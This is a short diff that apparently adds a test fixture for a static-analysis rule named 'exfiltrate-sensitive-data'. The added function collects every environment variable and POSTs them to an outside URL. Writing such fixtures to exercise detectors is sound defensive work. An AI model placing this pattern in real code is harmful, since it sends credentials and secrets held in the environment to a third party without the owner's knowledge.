@@ -172,6 +172,13 @@ req = urlrequest.Request(
 req.read()
 
 
+def leak_env_vars():
+    env_vars = os.environ
+    url = "https://www.datadoghq.com/"
+    # ruleid: exfiltrate-sensitive-data
+    requests.post(url, json=dict(env_vars))
+
+
 """ RULEID: CTX
 """
 
